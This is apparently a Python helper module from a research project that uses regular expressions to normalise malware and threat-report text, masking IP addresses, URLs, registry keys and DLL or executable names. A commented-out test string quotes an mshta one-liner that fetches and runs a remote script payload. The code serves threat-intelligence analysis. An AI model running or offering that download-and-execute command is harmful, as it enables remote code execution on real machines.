import re
ip_address_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(:\d{2,5})?')
registry_key_pattern = '(HKEY_LOCAL_MACHINE\\Software\\\Microsoft\\Windows\\\CurrentVersion\\)'
malware_family_pattern = re.compile(r'(\w+\.)+')
url_pattern = re.compile(r'(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&\'\(\)\*\+,;=.]')
dll_pattern = re.compile('.*.dll')
exe_pattern = re.compile('.*.exe')
# registry_key_pattern = re.compile(r'(HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\)')
# (\w+\.\w+((\.|!)\w+)?)
# (\w+\.\w+((\.|!)\w+)?)

def regex_ip_address(sentence):
    while True:
        ip_match = ip_address_pattern.search(sentence, re.MULTILINE)
        if ip_match is None:
            break
        else:
            sentence = sentence.replace(ip_match.group(),'ip address')
            # print(sentence)
    return sentence

def regex_registry_key(sentence):
    if sentence.startswith('hkey') or sentence.startswith('hklm'):
        return 'registry key'
    else:
        return sentence
    # while True:
    #     registry_key_match = re.search(registry_key_pattern,sentence, re.MULTILINE)
    #     print(registry_key_match)
    #     if registry_key_match is None:
    #         print('No Match Found.')
    #         break
    #     else:
    #         sentence = sentence.replace(registry_key_match.group(),' registry key ')
    #         # print(sentence)
    # return sentence
def get_malware_name(text):
    result = malware_family_pattern.search(text)
    if result is not None:
        print(result.group()[:-1])
        return result.group()[:-1].lower()
    else:
        return False

def get_url_match(sentence):
    ss = sentence.split()
    print(ss)
    sss = list()
    for s in ss:
        url_matcher = url_pattern.search(s)
        if url_matcher is not None:
            sss.append('url')
        else:
            sss.append(s)
    # print(' '.join(sss))
    return ' '.join(sss)

def dll_matcher(sentence):
    text = re.sub(dll_pattern, ' dll file ', str(sentence))
    return text

def exe_matcher(sentence):
    text = re.sub(exe_pattern, ' executable file ', str(sentence))
    return text

if __name__ == '__main__':
    # from nltk.stem.wordnet import WordNetLemmatizer
    #
    # words = ['gave', 'copies', 'went', 'going', 'dating', 'using', 'used', 'use', 'copies the following dictionary']
    # for word in words:
    #     print(word + "-->" + WordNetLemmatizer().lemmatize(word, 'v'))
    # ss = 'copies the following dictionary'.split()
    # kk = ''
    # for s in ss:
    #     kk += WordNetLemmatizer().lemmatize(s, 'v') + ' '
    # print(kk)
    # get_malware_name('C:\\Users\\rrahman3\\Google Drive\\TTPSense_Evaluation\\Symantec Evaluation\\AllSymantecReports\\test\\AOL.Infostealer.Trojan.2003-041117-2145-99.txt')
    # get_malware_name('sfdsgv  adczbs wa yush041117-2145-99')
    # get_url_match('http://p//ultimatelogger.com/customers/ip.[REMOVED]')
    # get_url_match('uipoqworkas.com/whynot/sam.php')
    # pattern = re.compile(r'\<.*?\>')
    # tt = 'adversaries can <what>use<\what> <where>mshta.exe<\where> to <why>proxy <what>execution <\what> of malicious <where>.hta files<\where> and <where>javascript<\where> or <where>vbscript<\where><\why> through a <how>trusted windows utility<\how>.<where>files<\where> may be <what>executed<\what> by <how>mshta.exe through an inline script: mshta vbscript:close(execute("getobject(""script:https[:]//webserver/payload[.]sct"")"))<\how>'
    # tt = re.sub(pattern, ' ', tt)
    sent = '%system%\[random characters].dll'
    text = re.sub(dll_pattern, ' dll ', str(sent))
    print(text.strip())
